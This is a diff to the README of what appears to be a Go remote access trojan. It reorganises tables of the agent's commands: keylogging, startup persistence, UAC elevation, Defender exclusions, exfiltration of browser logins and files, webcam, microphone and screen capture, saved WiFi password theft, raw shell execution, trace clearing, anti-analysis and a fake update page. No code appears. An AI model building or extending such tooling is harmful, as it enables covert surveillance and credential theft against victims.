@@ -238,26 +238,12 @@ The final `.exe` is placed in your current directory.
 | `keylog_stop` | Stop the keylogger |
 | `persist` | Add persistence (Startup folder VBS stager) |
 | `unpersist` | Remove persistence |
-| `elevate` | Attempt UAC elevation to gain admin privileges |
-| `excludec` | Exclude C:\\ from Defender scans (via MpCmdRun.exe) |
-| `excludeall` | Exclude C:\\ through G:\\ from Defender |
-| `cleanup` | Clear temp files, history, and recycle bin |
-| `browserdb` | Exfiltrate browser databases (Chrome, Edge, Firefox) |
-| `parsebrowser` | Parse browser data locally |
-| `exfiltrate` | Exfil files (args: path, extensions, max_size) |
-| `download` | Download file from client (args: path) |
-| `upload` | Upload file to client (args: path, data) |
-| `foldertree` | Show folder trees for Desktop/Docs/Downloads |
-| `webcam` | Start webcam capture job |
-| `microphone` | Start microphone recording job |
-| `recordscreen` | Record screen video (args: seconds) |
-| `wifi` | Show saved WiFi networks + passwords |
-| `nearbywifi` | Show nearby WiFi networks |
-| `enumeratelan` | Scan LAN for devices |
-| `shell` | Execute raw shell command |
-| `processes` | List running processes |
-| `jobs` | List running background jobs |
-| `pausejobs` | Stop all background jobs |
+| `cleanup` | Clear traces |
+| `sleep` | Sleep N seconds |
+| `antianalysis` | VM/debugger detection report |
+| `jobs` | List active background jobs |
+| `kill` | Stop a background job (or process on Windows) |
+| `pausejobs` | Stop all jobs |
 | `resumejobs` | Resume default jobs |
 | `kill` | Kill a process (args: pid) or stop a job (args: job) |
 | `enableio` | Enable keyboard/mouse (admin) |
@@ -276,7 +262,35 @@ The final `.exe` is placed in your current directory.
 
 ---
 
-## Project Structure
+| Command | Description |
+|---------|-------------|
+| `elevate` | UAC elevation |
+| `excludec` | Add Defender exclusion for C:\\ |
+| `excludeall` | Add Defender exclusions C:-G:\\ |
+| `enableio` | Enable input (keyboard/mouse) |
+| `disableio` | Disable input (keyboard/mouse) |
+| `webcam` | Capture from webcam |
+| `keycapture` | Start keylogger |
+| `keylog_stop` | Stop keylogger |
+| `recordscreen` | Record screen video |
+| `browserdb` | Exfiltrate browser databases |
+| `parsebrowser` | Extract browser URLs/logins |
+| `processes` | List running processes |
+| `list` | List directory contents |
+| `nearbywifi` | Scan nearby WiFi networks |
+| `enumeratelan` | LAN discovery (ping sweep) |
+| `message` | Show message box |
+| `wallpaper` | Change wallpaper |
+| `minimizeall` | Minimize all windows |
+| `vnc_start` | Start remote desktop |
+| `vnc_stop` | Stop remote desktop |
+| `darkmode` | Switch to dark mode |
+| `lightmode` | Switch to light mode |
+| `shortcutbomb` | Create desktop shortcuts |
+| `fakeupdate` | Open fake update page |
+| `soundspam` | Play system sounds |
+
+### Android-Only Commands
 
 ```
 main.go              - Go payload (RAT agent)
